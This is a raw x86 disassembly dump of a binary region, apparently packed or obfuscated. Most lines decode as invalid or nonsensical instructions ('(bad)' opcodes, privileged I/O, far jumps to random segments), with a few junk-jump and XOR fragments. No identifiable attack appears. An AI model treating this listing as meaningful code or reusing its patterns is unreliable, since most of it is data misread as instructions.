  40f26e:	push   es
  40f26f:	stc    
  40f270:	mov    ah,0x9
  40f272:	in     eax,0xb6
  40f274:	mov    ah,0x6e
  40f276:	mov    al,ds:0x9434ecd8
  40f27b:	pop    edx
  40f27c:	mov    esi,0xa462f407
  40f281:	sub    esp,eax
  40f283:	lahf   
  40f284:	cmp    eax,0xd796616a
  40f289:	dec    edx
  40f28a:	mov    BYTE PTR [esi-0x3d093c47],0x41
  40f291:	inc    ecx
  40f292:	add    esi,DWORD PTR [edx-0x7ab76a4b]
  40f298:	shl    DWORD PTR [eax],cl
  40f29a:	mov    esp,0xac5513e
  40f29f:	sbb    eax,0xd4eaca15
  40f2a4:	pop    esi
  40f2a5:	scas   al,BYTE PTR es:[edi]
  40f2a6:	xlat   BYTE PTR ds:[ebx]
  40f2a7:	or     edi,DWORD PTR [ecx-0x62]
  40f2aa:	cmp    DWORD PTR [esi],edx
  40f2ac:	inc    edx
  40f2ad:	imul   edx,DWORD PTR [edx+eiz*4-0x52],0x6953fb97
  40f2b5:	mov    BYTE PTR [eax],ah
  40f2b7:	dec    ebx
  40f2b8:	int3   
  40f2b9:	test   BYTE PTR [edx+0x4c869d85],dl
  40f2bf:	pop    ebx
  40f2c0:	xor    esi,DWORD PTR [eax]
  40f2c2:	pushf  
  40f2c3:	loop   0x40f340
  40f2c5:	push   ebx
  40f2c6:	lea    edi,[ecx-0x70]
  40f2c9:	mov    ss,WORD PTR [eax]
  40f2cb:	loope  0x40f34a
  40f2cd:	(bad)  
  40f2ce:	cmp    ebp,DWORD PTR [esi+0x5e372ab1]
  40f2d4:	cmp    esp,ebp
  40f2d6:	and    eax,DWORD PTR [edi+edx*1-0xf87a8ed]
  40f2dd:	hlt    
  40f2de:	in     al,0x29
  40f2e0:	and    eax,0x3967bd14
  40f2e5:	or     BYTE PTR [esi-0x7f],bl
  40f2e8:	cmc    
  40f2e9:	dec    edx
  40f2ea:	fwait
  40f2eb:	out    0x6c,al
  40f2ed:	push   ecx
  40f2ee:	sub    eax,0x38a8f162
  40f2f3:	xchg   ebp,eax
  40f2f4:	and    DWORD PTR [edx],ecx
  40f2f6:	ficom  WORD PTR [ebp+ebp*4+0x2e]
  40f2fa:	dec    ebx
  40f2fb:	nop
  40f2fc:	rcl    DWORD PTR [edi],0xae
  40f2ff:	in     eax,dx
  40f300:	sub    al,0xce
  40f302:	dec    eax
  40f303:	pop    ebx
  40f304:	jb     0x40f298
  40f306:	loopne 0x40f28f
  40f308:	inc    ecx
  40f309:	or     eax,0xb7d9f8f3
  40f30e:	push   ds
  40f30f:	xchg   edx,eax
  40f310:	je     0x40f346
  40f312:	(bad)  
  40f313:	(bad)  
  40f314:	stos   BYTE PTR es:[edi],al
  40f315:	imul   DWORD PTR [eax+0x450b7606]
  40f31b:	jle    0x40f317
  40f31d:	imul   edx,DWORD PTR [esi-0x6bea881],0x5
  40f324:	jns    0x40f2ce
  40f326:	enter  0x89d7,0x2
  40f32a:	shl    BYTE PTR [ecx-0x6f8d1860],0x80
  40f331:	les    ebx,FWORD PTR [esi-0x586d42f2]
  40f337:	dec    ebp
  40f338:	pop    ecx
  40f339:	jle    0x40f3af
  40f33b:	shl    dh,0xd
  40f33e:	push   0x913ea70d
  40f343:	pop    esi
  40f344:	shr    BYTE PTR [esi],cl
  40f346:	mov    ecx,0x8b6dca72
  40f34b:	cdq    
  40f34c:	cmp    BYTE PTR [esi+0x6af096ab],al
  40f352:	test   eax,ebp
  40f354:	add    dh,0xb2
  40f357:	mov    dl,0xb4
  40f359:	jmp    0x40f315
  40f35b:	dec    esi
  40f35c:	std    
  40f35d:	mov    bh,0xd4
  40f35f:	lock jmp 0x7c8e:0x2d4253a1
  40f367:	retf   
  40f368:	test   BYTE PTR [esi-0x20],bl
  40f36b:	xchg   edi,eax
  40f36c:	into   
  40f36d:	(bad)  [edi]
  40f36f:	lea    esp,[edx-0x5032b81d]
  40f375:	or     dl,BYTE PTR [esi+0xa]
  40f378:	cmp    al,0x95
  40f37a:	mov    eax,0xa8ad5b01
  40f37f:	cmp    ch,BYTE PTR [edx+0x48]
  40f382:	mov    ah,0x95
  40f384:	inc    edi
  40f385:	ss popa 
  40f387:	mov    ch,BYTE PTR [esi+0xfb54778]
  40f38d:	jo     0x40f37c
  40f38f:	stos   DWORD PTR es:[edi],eax
  40f390:	in     eax,dx
  40f391:	rol    BYTE PTR [edx-0x77],cl
  40f394:	and    bh,BYTE PTR [esi-0x11]
  40f397:	cli    
  40f398:	cmp    al,0xad
  40f39a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f39b:	pinsrw mm4,WORD PTR [esi],0x66
  40f39f:	popa   
  40f3a0:	les    esi,FWORD PTR [eax-0x97d5c5a]
  40f3a6:	sti    
  40f3a7:	pop    ecx
  40f3a8:	xchg   ebp,eax
  40f3a9:	xchg   eax,eax
  40f3ab:	in     al,0xbd
  40f3ad:	xor    BYTE PTR [ebp-0x2aa0eb24],ah
  40f3b3:	cmp    dl,BYTE PTR [ecx+0x0]
  40f3b6:	jo     0x40f402
  40f3b8:	inc    eax
  40f3b9:	push   DWORD PTR [ecx+0x4d]
  40f3bc:	mov    ds:0x65018332,eax
  40f3c1:	data16 stos BYTE PTR es:[edi],al
  40f3c3:	outs   dx,DWORD PTR ds:[esi]
  40f3c4:	arpl   cx,bp
  40f3c6:	dec    edi
  40f3c7:	sub    eax,0x3b7e2bd1
  40f3cc:	lods   al,BYTE PTR ds:[esi]
  40f3cd:	sbb    bl,ah
  40f3cf:	test   DWORD PTR es:[edi-0x44c5c5a],eax
  40f3d6:	(bad)  
  40f3d7:	cmp    BYTE PTR [eax],bl
  40f3d9:	adc    BYTE PTR [eax+ecx*4-0x11],bh
  40f3dd:	repz add eax,0x327857c0
  40f3e3:	retf   0xded9
  40f3e6:	daa    
  40f3e7:	xor    cl,BYTE PTR [eax-0x4a72ba4d]
  40f3ed:	leave  
  40f3ee:	jnp    0x40f3aa
  40f3f0:	(bad)  
  40f3f1:	pop    esi
  40f3f2:	into   
  40f3f3:	in     eax,0x79
  40f3f5:	dec    ecx
  40f3f6:	xor    al,0xf5
  40f3f8:	pop    esi
  40f3f9:	add    eax,ebx
  40f3fb:	pop    ebx
  40f3fc:	leave  
  40f3fd:	ret    0x8
  40f400:	push   ebp
  40f401:	mov    ebp,esp
  40f403:	push   ecx
  40f404:	mov    DWORD PTR ds:0x433727,0x6a14
  40f40e:	push   ecx
  40f40f:	xor    ecx,edx
  40f411:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40f418:	jmp    0x40f6e7
  40f41d:	call   0xa1f0:0x6df6cd0b
  40f424:	push   ebx
  40f425:	inc    ebx
  40f426:	push   edi
  40f427:	dec    ecx
  40f428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f429:	inc    edx
  40f42a:	sub    esi,DWORD PTR [edi-0x61]
  40f42d:	scas   eax,DWORD PTR es:[edi]
  40f42e:	stos   DWORD PTR es:[edi],eax
  40f42f:	jle    0x40f4af
  40f431:	lods   al,BYTE PTR ds:[esi]
  40f432:	jl     0x40f4b2
  40f434:	jle    0x40f46e
  40f436:	or     eax,0x55740ed
  40f43b:	dec    edi
  40f43c:	call   0xd7da:0x9948f40a
  40f443:	mov    WORD PTR [ebx+0x4652e28f],ds
  40f449:	bound  eax,QWORD PTR [ecx]
  40f44b:	popf   
  40f44c:	add    bh,BYTE PTR [ecx-0x6]
  40f44f:	pop    ecx
  40f450:	repz lock mov al,0x5e
  40f454:	xchg   ebp,eax
  40f455:	inc    edx
  40f456:	imul   edx,esp,0x81ce8a6c
  40f45c:	fidivr DWORD PTR [ebp-0x537456bf]
  40f462:	pop    eax
  40f463:	jecxz  0x40f467
  40f465:	dec    esp
  40f466:	bound  edx,QWORD PTR [edi+0x32]
  40f469:	dec    esp
  40f46a:	mov    DWORD PTR [eax],esp
  40f46c:	cmp    al,0xad
  40f46e:	cmp    esp,ecx
  40f470:	cld    
  40f471:	adc    DWORD PTR [edx],esi
  40f473:	sahf   
  40f474:	je     0x40f459
  40f476:	popa   
  40f477:	push   esp
  40f478:	js     0x40f4a8
  40f47a:	add    cl,bl
  40f47c:	or     al,BYTE PTR [ecx+0x40579738]
  40f482:	mov    ah,BYTE PTR [edi+0x4c591748]
  40f488:	cmp    BYTE PTR [ebx-0xc],0x6a
  40f48c:	or     cl,BYTE PTR [ecx-0x43d9a586]
  40f492:	jbe    0x40f487
  40f494:	mov    al,ds:0xfee97629
  40f499:	inc    DWORD PTR [edx]
  40f49b:	aaa    
  40f49c:	jne    0x40f461
  40f49e:	dec    esi
  40f49f:	retf   
  40f4a0:	arpl   WORD PTR [edi-0x71bc70fa],bp
  40f4a6:	(bad)  
  40f4a7:	(bad)  
  40f4a8:	cmp    ebp,DWORD PTR [ebx+0xe]
  40f4ab:	inc    edi
  40f4ac:	loop   0x40f50b
  40f4ae:	jl     0x40f47c
  40f4b0:	and    BYTE PTR [ebx-0x4ab44ec7],dh
  40f4b6:	call   0x185e0d44
  40f4bb:	push   esp
  40f4bc:	fist   DWORD PTR [eax+0x4b9fee58]
  40f4c2:	retf   0xb5
  40f4c5:	mov    dh,0x6e
  40f4c7:	pop    ecx
  40f4c8:	mov    BYTE PTR [ecx+ebp*2-0x32],ch
  40f4cc:	les    ecx,FWORD PTR [edi]
  40f4ce:	and    al,0xbd
  40f4d0:	sbb    al,0x87
  40f4d2:	dec    edx
  40f4d3:	inc    ebx
  40f4d4:	xchg   ebx,eax
  40f4d5:	fcom   QWORD PTR [ecx+0x6d]
  40f4d8:	pusha  
  40f4d9:	jmp    0x40f489
  40f4db:	and    DWORD PTR [ebx],esi
  40f4dd:	jg     0x40f4ce
  40f4df:	fstp   DWORD PTR [ebp-0x77aa33ae]
  40f4e5:	xor    DWORD PTR [eax+0x20c822ed],edx
  40f4eb:	jmp    0x40f4ec
  40f4ed:	jns    0x40f562
  40f4ef:	enter  0xc197,0x88
  40f4f3:	cmp    al,0x20
  40f4f5:	pop    ebx
  40f4f6:	ret    
  40f4f7:	aam    0x5a
  40f4f9:	hlt    
  40f4fa:	xchg   esi,eax
  40f4fb:	leave  
  40f4fc:	pop    edx
  40f4fd:	add    esp,DWORD PTR [ecx]
  40f4ff:	out    0x40,al
  40f501:	jne    0x40f4d1
  40f503:	and    ebp,edx
  40f505:	mov    eax,0xdf34921d
  40f50a:	in     eax,0x8b
  40f50c:	test   DWORD PTR [ebp+edx*1+0x5e6b6652],eax
  40f513:	pop    es
  40f514:	loopne 0x40f4b8
  40f516:	popa   
  40f517:	push   ebp
  40f518:	ror    BYTE PTR [esp+eiz*8],cl
  40f51b:	push   es
  40f51c:	stos   DWORD PTR es:[edi],eax
  40f51d:	mov    edi,0x74133aa9
  40f522:	test   eax,0x2652adf5
  40f527:	pusha  
  40f528:	pop    ecx
  40f529:	out    dx,eax
  40f52a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f52b:	fisttp QWORD PTR [ebx+0x7f79da36]
  40f531:	neg    ecx
  40f533:	xchg   edi,eax
  40f534:	(bad)
  40f537:	xchg   DWORD PTR [ecx+eiz*4-0x43],ecx
  40f53b:	jne    0x40f58b
  40f53d:	les    esi,FWORD PTR [ebp-0x7c817b9f]
  40f543:	popf   
  40f544:	daa    
  40f545:	mov    esp,0x639bd308
  40f54a:	pop    ebx
  40f54b:	dec    esi
  40f54c:	or     bh,BYTE PTR [eiz*1-0x32787394]
  40f553:	shr    BYTE PTR [ebx],1
  40f555:	pushf  
  40f556:	call   0xce3f0f40
  40f55b:	mov    eax,0x1f79357d
  40f560:	jo     0x40f523
  40f562:	mov    eax,ds:0xfd5d7b78
  40f567:	stos   BYTE PTR es:[edi],al
  40f568:	cmp    BYTE PTR [ebp-0x54],bh
  40f56b:	gs push ds
  40f56d:	ror    DWORD PTR [edi-0x46],1
  40f570:	lds    ebp,FWORD PTR [ecx+0xfc8ceb2]
  40f576:	(bad)  
  40f577:	sti    
  40f578:	and    DWORD PTR [edi+0x68eb9034],ecx
  40f57e:	fwait
  40f57f:	jecxz  0x40f510
  40f581:	loope  0x40f524
  40f583:	test   eax,0x4effc0cb
  40f588:	push   ecx
  40f589:	push   ss
  40f58a:	or     ecx,DWORD PTR [esi+0x7bc3bb23]
  40f590:	(bad)  
  40f591:	sar    DWORD PTR [edi],0x4c
  40f594:	or     edx,0xffffff88
  40f597:	push   esp
  40f598:	mov    esi,0x9dca1d10
  40f59d:	cmp    edi,edi
  40f59f:	fcomp  QWORD PTR [eax+0x692dea99]
  40f5a5:	mov    al,ds:0xb62df34f
  40f5aa:	inc    ebx
  40f5ab:	cmp    cl,cl
  40f5ad:	xor    DWORD PTR [ebx+ecx*8-0x2bf0402c],ebx
  40f5b4:	sub    eax,0x85cf6176
  40f5b9:	bound  esi,QWORD PTR [ebp+0x5669884c]
  40f5bf:	cmp    edi,esi
  40f5c1:	mov    edx,0x62819033
  40f5c6:	std    
  40f5c7:	jmp    0x40f585
  40f5c9:	add    BYTE PTR [ebx+0xb],dl
  40f5cc:	cmp    ecx,ebx
  40f5ce:	ret    
  40f5cf:	mov    ecx,0x4f5d2d9f
  40f5d4:	mov    al,ds:0x4f34e320
  40f5d9:	ss pushf 
  40f5db:	shr    BYTE PTR [edi-0x3e01bb70],1
  40f5e1:	and    al,0xc5
  40f5e3:	pop    ss
  40f5e4:	jns    0x40f638
  40f5e6:	mov    eax,0x9b62ee22
  40f5eb:	cmp    BYTE PTR [ebp-0x5e],dl
  40f5ee:	out    0xea,al
  40f5f0:	push   ss
  40f5f1:	fwait
  40f5f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5f3:	cmc    
  40f5f4:	xor    al,BYTE PTR [ecx]
  40f5f6:	retf   
  40f5f7:	cmp    ebp,DWORD PTR [edx]
  40f5f9:	jecxz  0x40f592
  40f5fb:	rcr    DWORD PTR [edx+0x70bd72c1],cl
  40f601:	xor    al,BYTE PTR [eax-0x1]
  40f604:	imul   eax,DWORD PTR [ebx+0x29],0xffffffe7
  40f608:	jae    0x40f660
  40f60a:	or     al,0xa0
  40f60c:	add    edi,DWORD PTR [edx-0x20]
  40f60f:	xor    ch,ah
  40f611:	cwde   
  40f612:	xchg   edx,eax
  40f613:	add    DWORD PTR es:[edx],edi
  40f616:	mov    ds:0x1effdb58,al
  40f61b:	sbb    ecx,0x735cd4ea
  40f621:	mov    ebp,0xa1609bb4
  40f626:	hlt    
  40f627:	xor    edi,eax
  40f629:	jge    0x40f5ca
  40f62b:	mov    ecx,esi
  40f62d:	jae    0x40f667
  40f62f:	aas    
  40f630:	test   eax,0x5d88e495
  40f635:	ins    DWORD PTR es:[edi],dx
  40f636:	and    DWORD PTR [eax+eiz*1],edi
  40f639:	fs ficomp DWORD PTR es:[edi]
  40f63d:	(bad)  
  40f63e:	loop   0x40f677
  40f640:	je     0x40f63f
  40f642:	test   eax,0x15ff66f2
  40f647:	or     ebx,edi
  40f649:	mov    bl,0x96
  40f64b:	dec    edx
  40f64c:	push   esp
  40f64d:	or     BYTE PTR [eax-0x2d],al
  40f650:	out    0x48,al
  40f652:	stos   DWORD PTR es:[edi],eax
  40f653:	jmp    0xeb4f:0x9fa73813
  40f65a:	pop    ecx
  40f65b:	add    al,0x3b
  40f65d:	xchg   esi,eax
  40f65e:	mov    eax,0x34c95b04
  40f663:	sub    DWORD PTR [ecx+0x15],esp
  40f666:	daa    
  40f667:	stos   BYTE PTR es:[edi],al
  40f668:	cdq    
  40f669:	fistp  WORD PTR [edi+0x15]
  40f66c:	mov    ds:0xf6cc087f,al
  40f671:	or     ecx,DWORD PTR ds:0xd40e9281
  40f677:	xor    eax,DWORD PTR fs:[edi+eiz*1+0x77]
  40f67c:	cmp    BYTE PTR [ebp+0x76],0x92
  40f680:	stc    
  40f681:	adc    edi,DWORD PTR [edi+esi*1+0x1271068a]
  40f688:	leave  
  40f689:	mov    BYTE PTR [ebx+0x47],ah
  40f68c:	xchg   edi,eax
  40f68d:	mov    WORD PTR [ebx],fs
  40f68f:	inc    edx
  40f690:	sbb    BYTE PTR [eax+0x5214f95a],ch
  40f696:	add    BYTE PTR [ecx+0x78a6fbbc],cl
  40f69c:	in     al,0xa1
  40f69e:	inc    esp
  40f69f:	mov    dh,0x3b
  40f6a1:	fcom   QWORD PTR [ecx-0x14]
  40f6a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6a5:	cli    
  40f6a6:	inc    edx
  40f6a7:	push   ds
  40f6a8:	or     BYTE PTR [ebx],dl
  40f6aa:	fs aaa 
  40f6ac:	inc    ebp
  40f6ad:	pusha  
  40f6ae:	scas   eax,DWORD PTR es:[edi]
  40f6af:	pop    esp
  40f6b0:	xchg   esi,eax
  40f6b1:	jge    0x40f65d
  40f6b3:	sbb    BYTE PTR [eax],dl
  40f6b5:	dec    ebp
  40f6b6:	mov    edi,edi
  40f6b8:	pop    edx
  40f6b9:	jno    0x40f6c6
  40f6bb:	cmp    eax,DWORD PTR [edi+ebp*2]
  40f6be:	test   eax,0x9b32a593
  40f6c3:	(bad)  
  40f6c4:	push   es
  40f6c5:	loop   0x40f690
  40f6c7:	pop    edi
  40f6c8:	rol    BYTE PTR [ecx+0x5e04f793],0xd6
  40f6cf:	imul   ebp,DWORD PTR [ebp+esi*1-0x799c2e5d],0x3d62741
  40f6da:	mov    dl,0x7a
  40f6dc:	adc    al,0x9d
  40f6de:	push   es
  40f6df:	aam    0xdb
  40f6e1:	cli    
  40f6e2:	xchg   ebx,eax
  40f6e3:	or     dh,BYTE PTR [edi+0x45c70e4c]
  40f6e9:	cld    
  40f6ea:	xor    al,BYTE PTR [ebp+0x2d81f89c]
  40f6f0:	daa    
  40f6f1:	aaa    
  40f6f2:	inc    ebx
  40f6f3:	add    BYTE PTR [edx+0x5c],dh
  40f6f6:	add    BYTE PTR [eax],al
  40f6f8:	mov    eax,DWORD PTR [ebp-0x4]
  40f6fb:	add    DWORD PTR ds:0x4336e7,0x767c
  40f705:	jmp    0x40f9d4
  40f70a:	ins    BYTE PTR es:[edi],dx
  40f70b:	xchg   BYTE PTR [eax+0x70d870dc],ah
  40f711:	xchg   esi,eax
  40f712:	in     eax,0xdf
  40f714:	or     eax,ebp
  40f716:	mov    dl,0xc5
  40f718:	xor    BYTE PTR [esi-0x23],0xb6
  40f71c:	jle    0x40f79c
  40f71e:	lods   al,BYTE PTR ds:[esi]
  40f71f:	jl     0x40f79f
  40f721:	jle    0x40f738
  40f723:	mov    bl,0x99
  40f725:	pop    ecx
  40f726:	xor    ch,BYTE PTR [edi]
  40f728:	bound  esi,QWORD PTR [esi]
  40f72a:	ins    BYTE PTR es:[edi],dx
  40f72b:	push   edx
  40f72c:	push   esp
  40f72d:	fcmovbe st,st(6)
  40f72f:	pop    esi
  40f730:	ss outs dx,DWORD PTR fs:[esi]
  40f733:	punpcklwd mm1,DWORD PTR [ecx+0x1b]
  40f737:	addr16 push ss
  40f739:	mov    cl,0x9b
  40f73b:	push   ebp
  40f73c:	and    BYTE PTR [ebx+0x1cad713f],al
  40f742:	sbb    DWORD PTR [eax+eax*2-0x7e12d7fe],edi
  40f749:	push   eax
  40f74a:	mov    esi,0x63cc44b
  40f74f:	out    0xe1,eax
  40f751:	lahf   
  40f752:	dec    edi
  40f753:	lods   eax,DWORD PTR ds:[esi]
  40f754:	mov    esi,DWORD PTR [edx+0x7b1b4e01]
  40f75a:	xor    eax,0x856216b4
  40f75f:	mov    bl,0x77
  40f761:	arpl   WORD PTR [ebp+0x61698d24],di
  40f767:	frstor [eax]
  40f769:	mov    esi,0xf65984dc
  40f76e:	stos   BYTE PTR es:[edi],al
  40f76f:	inc    edx
  40f770:	or     BYTE PTR [edx-0x72],0x2b
  40f774:	int    0xb8
  40f776:	retf   0x589a
  40f779:	sub    ebx,esi
  40f77b:	pop    ds
  40f77c:	mov    eax,0x9abcdd03
  40f781:	in     eax,dx
  40f782:	test   BYTE PTR [esi+0x15],bh
  40f785:	jnp    0x40f7aa
  40f787:	dec    edx
  40f788:	jno    0x40f77b
  40f78a:	data16 sbb dh,bh
  40f78d:	in     eax,dx
  40f78e:	addr16 dec ebx
  40f790:	xor    al,0xf
  40f792:	dec    ebp
  40f793:	push   es
  40f794:	mov    ebp,0x8debef29
  40f799:	dec    esi
  40f79a:	push   0x5c06ab3a
  40f79f:	sti    
  40f7a0:	and    al,0x1b
  40f7a2:	jae    0x40f761
  40f7a4:	imul   eax,DWORD PTR [ebx],0x6a
  40f7a7:	xor    bh,bl
  40f7a9:	adc    eax,0xb26f013e
  40f7ae:	adc    BYTE PTR [edi+0x2a],dh
  40f7b1:	stos   DWORD PTR es:[edi],eax
  40f7b2:	(bad)  
  40f7b3:	pop    esi
  40f7b4:	int    0x6d
  40f7b6:	sbb    BYTE PTR [edx-0x59],dh
  40f7b9:	xlat   BYTE PTR ds:[ebx]
  40f7ba:	sahf   
  40f7bb:	inc    ecx
  40f7bc:	clc    
  40f7bd:	xor    BYTE PTR [edx],0x6c
  40f7c0:	(bad)  
  40f7c1:	(bad)  
  40f7c3:	mov    dl,0xd4
  40f7c5:	jl     0x40f83f
  40f7c7:	bound  edx,QWORD PTR [esi]
  40f7c9:	xor    esp,ecx
  40f7cb:	(bad)  
  40f7cc:	xchg   ebx,eax
  40f7cd:	(bad)  [edx-0x4d]
  40f7d0:	iret   
  40f7d1:	pop    es
  40f7d2:	jmp    0xc4f7762b
  40f7d7:	iret   
  40f7d8:	rcr    BYTE PTR [eax],0xa9
  40f7db:	cmp    ah,BYTE PTR ds:0x55df9354
  40f7e1:	test   al,0x14
  40f7e3:	dec    edi
  40f7e4:	mov    edi,0x1a6f0be8
  40f7e9:	int3   
  40f7ea:	pop    edx
  40f7eb:	jle    0x40f866
  40f7ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7ee:	pop    esp
  40f7ef:	shr    edx,cl
  40f7f1:	xor    esi,DWORD PTR [esi]
  40f7f3:	mov    eax,0x1e050d81
  40f7f8:	std    
  40f7f9:	test   eax,0xb818b745
  40f7fe:	ret    
  40f7ff:	xchg   esi,eax
  40f800:	lods   al,BYTE PTR ds:[esi]
  40f801:	jmp    0x40f7f6
  40f803:	psllw  mm1,QWORD PTR ds:[edx-0x5]
  40f808:	cmp    BYTE PTR [edi],cl
  40f80a:	jl     0x40f7d9
  40f80c:	sti    
  40f80d:	or     cl,BYTE PTR [eax-0xeb8898f]
  40f813:	jmp    0xeb4c:0x1da28aa4
  40f81a:	mov    ds:0xee4592f7,al
  40f81f:	int3   
  40f820:	jmp    0xa28fc6ce
  40f825:	pop    es
  40f826:	sub    eax,0x5fdacd3c
  40f82b:	(bad)  
  40f82c:	mov    dl,0xdb
  40f82e:	inc    ebx
  40f82f:	adc    al,0x88
  40f831:	aaa    
  40f832:	fst    DWORD PTR [esi+0x76e5c9dc]
  40f838:	arpl   WORD PTR [edi-0x6dd3e0d0],dx
  40f83e:	sub    ah,BYTE PTR ds:0x38a878b3
  40f844:	xchg   ebx,eax
  40f845:	sahf   
  40f846:	jmp    0x40f7f2
  40f848:	sahf   
  40f849:	in     eax,0xfe
  40f84b:	enter  0x95a5,0xa7
  40f84f:	add    ebp,DWORD PTR [edx-0x7765eeb8]
  40f855:	push   ebx
  40f856:	jp     0x40f837
  40f858:	ficomp DWORD PTR [edi]
  40f85a:	add    al,0x5f
  40f85c:	sub    al,0xad
  40f85e:	add    DWORD PTR [eax+0x24],ebx
  40f861:	xor    DWORD PTR [ebx],0x44
  40f864:	xor    cl,dl
  40f866:	aaa    
  40f867:	dec    ebx
  40f868:	jne    0x40f876
  40f86a:	jmp    0xcf120ed3
  40f86f:	inc    edi
  40f870:	ret    0x6da1
  40f873:	lods   al,BYTE PTR ds:[esi]
  40f874:	cs xchg esp,eax
  40f876:	cmp    bl,ah
  40f878:	mov    dl,0x42
  40f87a:	and    al,0x54
  40f87c:	ror    esp,1
  40f87e:	cmp    ebx,ebp
  40f880:	or     BYTE PTR ds:0x93e0d694,bh
  40f886:	add    eax,0x2abf6cc3
  40f88b:	imul   edi,DWORD PTR ds:0xc31a65be,0xb2723841
  40f895:	shl    DWORD PTR [ebx],1
  40f897:	mov    cl,0x8b
  40f899:	jmp    0x40f892
  40f89b:	adc    dl,BYTE PTR [edx-0x16]
  40f89e:	sti    
  40f89f:	inc    ebp
  40f8a0:	inc    ebp
  40f8a1:	imul   eax,DWORD PTR es:[ebx+edx*1+0x2a5d8894],0x8efd65c7
  40f8ad:	rol    DWORD PTR [edi+0x763c6877],cl
  40f8b3:	pusha  
  40f8b4:	in     al,dx
  40f8b5:	aaa    
  40f8b6:	mov    al,0x97
  40f8b8:	fnsave [esi]
  40f8ba:	sub    esi,DWORD PTR [ecx+0x74]
  40f8bd:	mov    ds:0xae253d9e,eax
  40f8c2:	(bad)  [ecx-0x60]
  40f8c5:	pop    esi
  40f8c6:	jg     0x40f8f7
  40f8c8:	add    DWORD PTR [eax],edx
  40f8ca:	fcomp  QWORD PTR [ecx-0x3c]
  40f8cd:	sub    BYTE PTR [ecx],dl
  40f8cf:	das    
  40f8d0:	mov    ecx,0x18b9e0dc
  40f8d5:	loop   0x40f85e
  40f8d7:	out    0x4c,al
  40f8d9:	pop    es
  40f8da:	mov    dl,0xe2
  40f8dc:	dec    eax
  40f8dd:	ficom  DWORD PTR [edx-0x20a26b4e]
  40f8e3:	arpl   WORD PTR [ecx-0x57dc2e63],sp
  40f8e9:	cdq    
  40f8ea:	outs   dx,BYTE PTR ds:[esi]
  40f8eb:	leave  
  40f8ec:	cmc    
  40f8ed:	sub    dh,bl
  40f8ef:	sub    bl,bl
  40f8f1:	jae    0x40f902
  40f8f3:	dec    ebx
  40f8f4:	jmp    0xeef52d8a
  40f8f9:	or     BYTE PTR [ecx+eax*1-0x62],0xf8
  40f8fe:	and    esp,DWORD PTR [edi-0x70e90be]
  40f904:	and    ebp,DWORD PTR [edx]
  40f906:	shr    DWORD PTR [esi+0x1543e3b1],cl
  40f90c:	and    BYTE PTR [ebp-0x8],bl
  40f90f:	lahf   
  40f910:	mov    eax,ds:0x52cf5b08
  40f915:	js     0x40f944
  40f917:	push   edx
  40f918:	js     0x40f904
  40f91a:	or     al,0xb6
  40f91c:	fs popf 
  40f91e:	jecxz  0x40f944
  40f920:	(bad)  
  40f921:	jns    0x40f8c1
  40f923:	mov    al,ds:0xd4ddd3f9
  40f928:	icebp  
  40f929:	xor    ebp,DWORD PTR [ecx+0x426180]
  40f92f:	je     0x40f9a2
  40f931:	hlt    
  40f932:	jb     0x40f971
  40f934:	mov    es,WORD PTR [ecx+0x7c]
  40f937:	outs   dx,DWORD PTR ds:[esi]
  40f938:	xchg   ebp,ebp
  40f93a:	mov    ds:0x8e21c111,eax
  40f93f:	xlat   BYTE PTR ds:[ebx]
  40f940:	clc    
  40f941:	mov    ch,0x49
  40f943:	and    al,0x3a
  40f945:	aas    
  40f946:	retf   
  40f947:	aad    0xc1
  40f949:	(bad)  [edx-0x1f80bc81]
  40f94f:	adc    DWORD PTR [eax-0x7c],esp
  40f952:	mov    ebp,0x54e58be
  40f957:	dec    ebx
  40f958:	inc    ecx
  40f959:	aaa    
  40f95a:	mov    ah,0xc8
  40f95c:	mov    al,0x26
  40f95e:	dec    ebx
  40f95f:	pop    edi
  40f960:	iret   
  40f961:	cmp    DWORD PTR [edi-0x71],edx
  40f964:	loop   0x40f99f
  40f966:	mov    bl,0x85
  40f968:	and    BYTE PTR [esi+0x59],ah
  40f96b:	ja     0x40f977
  40f96d:	or     DWORD PTR [ecx-0x7731d05c],ebx
  40f973:	sbb    al,0xb0
  40f975:	sbb    ah,BYTE PTR [edi+0x4b]
  40f978:	sahf   
  40f979:	in     al,dx
  40f97a:	jo     0x40f9ea
  40f97c:	dec    ecx
  40f97d:	icebp  
  40f97e:	(bad)  
  40f980:	add    eax,0x5e2d0461
  40f985:	jae    0x40f9f7
  40f987:	xchg   esp,eax
  40f988:	fist   DWORD PTR [eax+0x2667bdf0]
  40f98e:	jl     0x40f978
  40f990:	mov    eax,0xe1c0e2bf
  40f995:	jmp    0xa2f6:0x2020ee74
  40f99c:	jb     0x40f982
  40f99e:	mov    ds:0x2b548a41,al
  40f9a3:	mov    bl,0xa
  40f9a5:	(bad)  
  40f9a7:	sub    bl,BYTE PTR ds:0xbd23cee2
  40f9ad:	xlat   BYTE PTR ds:[ebx]
  40f9ae:	adc    cl,BYTE PTR [edx+0x6e1c9c57]
  40f9b4:	mov    dl,0xf1
  40f9b6:	jmp    0x40fa14
  40f9b8:	inc    ecx
  40f9b9:	mov    esp,gs
  40f9bb:	test   eax,esp
  40f9bd:	daa    
  40f9be:	inc    edx
  40f9bf:	xor    dl,BYTE PTR [ebp+0x16]
  40f9c2:	aaa    
  40f9c3:	pop    ecx
  40f9c4:	push   ebx
  40f9c5:	js     0x40f9be
  40f9c7:	aas    
  40f9c8:	das    
  40f9c9:	sbb    ebp,DWORD PTR [edx+esi*8]
  40f9cc:	mov    cl,0xc0
  40f9ce:	out    0x93,al
  40f9d0:	sbb    DWORD PTR [ebp+0x8],edx
  40f9d3:	adc    DWORD PTR [esi+0x13],0x43367735
  40f9da:	add    BYTE PTR [ebx-0x49f0078b],cl
  40f9e0:	or     eax,0x43367b
  40f9e5:	adc    DWORD PTR ds:0x433733,ecx
  40f9eb:	mov    edx,0x7510854
  40f9f0:	xor    eax,edx
  40f9f2:	xor    ecx,0x76d3
  40f9f8:	xor    esi,edx
  40f9fa:	mov    ecx,0x32729b
  40f9ff:	jmp    0x40fcce
  40fa04:	mov    eax,ds:0x696d6976
  40fa09:	jno    0x40f9ac
  40fa0b:	jb     0x40fa43
  40fa0d:	inc    eax
